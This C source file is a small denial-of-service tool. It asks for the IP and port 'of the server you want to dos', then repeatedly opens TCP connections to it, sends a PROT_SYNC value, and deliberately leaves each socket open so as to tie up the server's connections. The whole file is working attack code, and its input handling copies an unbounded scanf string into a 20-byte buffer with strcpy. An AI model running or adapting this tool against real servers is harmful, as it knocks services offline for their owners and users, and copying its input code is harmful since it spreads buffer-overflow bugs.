//
// Created by vlad on 31.03.19.
//

#include "dos.h"


int dos(struct Victim target) {
    int protocol, connect_fd, number_of_syncs = 0;
    ssize_t bytes_sent;
    struct sockaddr_in server_addr;
    socklen_t addr_len;
    protocol = PROT_SYNC;
    //Setup server address
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(target.port);
    server_addr.sin_addr.s_addr = inet_addr(target.ip_address);
    struct timeval timeout;
    timeout.tv_sec = 5;
    timeout.tv_usec = 0;


    // Send SYNC 50 times
    while (MAX_CONNECT > number_of_syncs) {
        number_of_syncs++;
        addr_len = sizeof(server_addr);
        //Create new socket for every new ping
        if ((connect_fd = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP)) == -1) {
            fprintf(stderr, "failed to create a socket to ping clients errno: %d\n", errno);
            return -1;
        }

        //Setting timeouts
        if (setsockopt(connect_fd, SOL_SOCKET, SO_SNDTIMEO, (char *) &timeout,
                       sizeof(timeout)) < 0) {
            printf("Setsockopt failed errno: %d", errno);
            return -1;
        }

        //Try to connect to the node
        if (connect(connect_fd, (struct sockaddr *) &server_addr, addr_len) == -1) {
            if (errno == ECONNREFUSED || errno == ETIMEDOUT || errno == ENETUNREACH) {
                fprintf(stderr, "Unable to connect, try again later\n");
                return -1;
            } else {
                fprintf(stderr, "failed to connect errno:%d\n", errno);
                return -1;
            }
        }

        //Send SYNC
        bytes_sent = sendto(connect_fd, (void *) &protocol, sizeof(protocol), 0,
                            (struct sockaddr *) &server_addr,
                            sizeof(struct sockaddr));
        if (bytes_sent == -1) {
            fprintf(stderr, "Unable to send bytes errno: %d\n", errno);
            return -1;
        }
        // Sleep a bit
        usleep(50000);
        // Throw the socket away
//        close(connect_fd);
    }
    return 0;
}


int main(void) {
    char ip[20];
    uint16_t port;
    struct Victim target;
    while (TRUE) {
        memset(&target, 0, sizeof(target));
        memset(ip, 0, sizeof(ip));
        printf("Enter IP:Port of the server you want to dos\n");
        scanf("%[^:]:%hu", ip, &port);
        strcpy(target.ip_address, ip);
        target.port = port;
        if (dos(target) == -1) {
            fprintf(stderr, "DOS on %s:%hu failed!\n", target.ip_address, target.port);
        } else {
            printf("Dos completed! \n");
        }
        int c;
        while ((c = getchar()) != '\n' && c != EOF);
    }
}